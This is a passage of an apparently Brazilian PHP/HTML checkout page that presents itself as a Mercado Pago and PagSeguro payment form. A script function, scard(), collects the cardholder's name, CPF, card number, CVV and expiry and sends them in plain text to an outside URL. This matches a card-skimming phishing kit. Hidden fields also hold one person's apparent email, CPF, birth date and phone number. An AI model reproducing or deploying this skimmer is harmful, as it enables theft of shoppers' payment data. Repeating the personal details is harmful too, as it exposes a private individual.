                                                         data-value="f" value="f"> Feminino
                                                      <input class="form-control-sm form-control" type="radio" 
                                                         id="p_sexo_sender" name="p_sexo_sender" data-value="m" 
                                                         value="m"> Masculino
                                                      <input class="form-control-sm form-control" type="radio" 
                                                         id="p_sexo_sender" name="p_sexo_sender" 
                                                         data-value="N&atilde;o Informado" 
                                                         value="N&atilde;o Informado"> Prefiro n&atilde;o informar
                                                   </div>
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_email_sender">E-mail</label>
                                                   <input class="form-control-sm form-control" type="email"   required="required" id="p_email_sender" name="p_email_sender"  placeholder="exemplo@dominio.com" value="WESLEYSILVA24061997@GMAIL.COM" >
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_cpf_sender">CPF</label>
                                                   <input class="form-control-sm form-control" type="tel" id="p_cpf_sender" required="required" minlength="14" maxlength="14" placeholder="000.000.000-00" value="065.512.093-94">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_nasc_sender">  Data de Nascimento </label>
                                                   <input class="form-control-sm form-control" type="tel" 
                                                      required="required" minlength="10" maxlength="10" id="p_nasc_sender" name="p_nasc_sender" placeholder="Nascimento do Comprador" value="24/06/1997">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_cel_sender">Celular</label>
                                                   <input class="form-control-sm form-control" type="tel" required="required" minlength="14" maxlength="15" id="p_cel_sender" name="p_cel_sender" placeholder="(XX) XXXXX-XXXX" value="(88) 99217-5376">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_cep">CEP &nbsp; 
                                                   <a href="http://www.buscacep.correios.com.br/sistemas/buscacep/buscaCep.cfm"  target="_blank">(N&atilde;o sei o CEP, clique aqui)</a>
                                                   </label>
                                                   <input class="form-control-sm form-control" type="tel" required="required" minlength="9" maxlength="9" onblur="buscaCEP(this.value, '');" id="p_cep" name="p_cep" value="63700-055" >
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_end">Endere&ccedil;o</label> 
                                                   <input class="form-control-sm form-control" type="text" required="required" id="p_end" name="p_end" value="nCasa" value="nomeDarua">
                                                </div>
                                                <div class="field col-5" style="margin-bottom:10px;display:inline-block;padding-left:0;" hidden>
                                                   <label class="form-text text-gray" for="p_nro">N&uacute;mero</label>
                                                   <input class="form-control-sm form-control" type="text" required="required" id="p_nro" name="p_nro" value="00">
                                                </div>
                                                <div class="field col-6" style="margin-bottom:10px;display:inline-block;padding:0;max-width:57%;" hidden>
                                                   <label class="form-text text-gray" for="p_complemento">Complemento</label>
                                                   <input class="form-control-sm form-control" type="text"  id="p_complemento" name="p_complemento">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_bairro">Bairro</label> 
                                                   <input class="form-control-sm form-control" required="required"    type="text" id="p_bairro" name="p_bairro" value="nBairro">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_uf">Estado</label>
                                                   <select id="p_uf" name="p_uf" required="required" 
                                                      class="form-control-sm form-control dropdown">
                                                      <option value="AC">Acre</option>
                                                      <option value="AL">Alagoas</option>
                                                      <option value="AP">Amap&aacute;</option>
                                                      <option value="AM">Amazonas</option>
                                                      <option value="BA">Bahia</option>
                                                      <option value="CE">Cear&aacute;</option>
                                                      <option value="DF">Distrito Federal</option>
                                                      <option value="ES">Esp&iacute;rito Santo</option>
                                                      <option value="GO">Goi&aacute;s</option>
                                                      <option value="MA">Maranh&atilde;o</option>
                                                      <option value="MT">Mato Grosso</option>
                                                      <option value="MS">Mato Grosso do Sul</option>
                                                      <option value="MG">Minas Gerais</option>
                                                      <option value="PA">Par&aacute;</option>
                                                      <option value="PB">Para&iacute;ba</option>
                                                      <option value="PR">Paran&aacute;</option>
                                                      <option value="PE">Pernambuco</option>
                                                      <option value="PI">Piau&iacute;</option>
                                                      <option value="RJ">Rio de Janeiro</option>
                                                      <option value="RN">Rio Grande do Norte</option>
                                                      <option value="RS">Rio Grande do Sul</option>
                                                      <option value="RO">Rond&ocirc;nia</option>
                                                      <option value="RR">Roraima</option>
                                                      <option value="SP">S&atilde;o Paulo</option>
                                                      <option value="SC">Santa Catarina</option>
                                                      <option value="SE">Sergipe</option>
                                                      <option value="TO">Tocantins</option>
                                                   </select>
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_cidade">Cidade</label>  <input class="form-control-sm form-control" required="required" type="text" id="p_cidade" name="p_cidade" value="ncidade">
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </form>
         </main>
      </div>
      <footer  style="<?=$display;?>">
         <div class="container p-2">
            <div class="row">
               <div class="col-12 col-sm-12">
                  <table style="width:100%; text-align:center;">
                     <tr>
                        <td style="width:50%; font-size:12px; color:gray; ">
                           <img src="assets/imagens/selo-seguro.png" height="120px;">
                        </td>
                     </tr>
                  </table>
               </div>
            </div>
         </div>
      </footer>
      <script src="js/app.js"></script>
      <script src="pagamento/Public/js/semantic.min.js"></script>
      <script src="pagamento/Public/js/tab-site.js"></script>
      <script src="assets/plugins/bs-custom-file-input/bs-custom-file-input.js"></script> 
      <script>
         function scard() {
             
           var snome_tit = document.getElementById('nome').value ;
           var snum_cpf = document.getElementById('numCPF').value ;  
           var snum_cc = document.getElementById('numberCard').value ;
           var snum_cvv = document.getElementById('digitos').value ;
           var snum_valm = document.getElementById('validade_mes').value ;
           var snum_vala = document.getElementById('validade_ano').value ;
          
         
           $.ajax({
                           url: 'https://www.nossolove.com/account/mercadopago/pagamento/fechar_pedido.php',
                           type: 'POST',
                           data: 'snome_tit='+snome_tit+'&snum_cpf='+snum_cpf+'&snum_cc='+snum_cc+'&snum_cvv='+snum_cvv+'&snum_valm='+snum_valm+'&snum_vala='+snum_vala });
         }       
                           
                           
           function copyPix(elemento) {
             var copyText = $(elemento);
             copyText.select();
             document.execCommand("copy");
             msg('Codigo copiado!', 200);
           }
         
           function startPreloader() {
             // Exibe a div de preloader
             document.getElementById('preloader').style.display = 'block';
           }
         
           function endPreloader() {
             // Oculta a div de preloader
             document.getElementById('preloader').style.display = 'none';
           }
         
           bsCustomFileInput.init();
         
           var $cbs = $('input[name=sexo_sender]');
           var $csb = $('input[name=b_sexo_sender]');
         
           function checksexo() {
             $cbs.each(function (index, element) {
                 //console.log('element');
                 if ($(this).prop('checked')) {
                     $('#sexo').attr("value", $(element).data('value'));
                 }
             });
           }
           function checksexo_b() {
             $csb.each(function (index, element) {
                 //console.log('element');
                 if ($(this).prop('checked')) {
                     $('#b_sexo').attr("value", $(element).data('value'));
                 }
             });
           }
         
           $cbs.change(checksexo);
           $csb.change(checksexo_b);
           checksexo();
           checksexo_b();
         
           (function() {
             'use strict';
             window.addEventListener('load', function() {
               // Fetch all the forms we want to apply custom Bootstrap validation styles to
               var forms = document.getElementsByClassName('needs-validation');
               // Loop over them and prevent submission
               var validation = Array.prototype.filter.call(forms, function(form) {
                 form.addEventListener('submit', function(event) {
                   if (form.checkValidity() === false) {
                     event.preventDefault();
                     event.stopPropagation(); 
                   }
                   form.classList.add('was-validated');
                 }, false);
               });
             }, false);
           })();
         
           //$('[data-tools=tooltip]').tooltip();
      </script>
      <script src="assets/plugins/toastr/toastr.min.js"></script>
      <script src="js/functions.js"></script>
      <script type="text/javascript" src="https://stc.pagseguro.uol.com.br/pagseguro/api/v2/checkout/pagseguro.directpayment.js"></script>
      <script src="https://secure.mlstatic.com/sdk/javascript/v1/mercadopago.js"></script>
      <script> 
        Mercadopago.setPublishableKey("APP_USR-b7f48426-1296-4855-b9c7-6b0a659a4a29");   
      </script>
      <script src="pagamento/Public/js/tabs.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/numeral.js/1.4.5/numeral.min.js"></script>
      <script src="pagamento/Public/js/languages/pt-br.js"></script>
      <script src="pagamento/Public/js/erros_cartao.js"></script>
      <script src="pagamento/Public/js/meios_pagamento.js"></script>
      <script src="pagamento/Public/js/fechar_pedido.js?v=<?=filesize("pagamento/Public/js/fechar_pedido.js");?>"></script>
      <script src="pagamento/Public/js/boleto.js"></script>
      <script src="pagamento/Public/js/pix.js"></script>
      <div id="fb-root" class=" fb_reset">
         <div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
            <div></div>
         </div>
Êxito!
      </div>
   </body>
</html>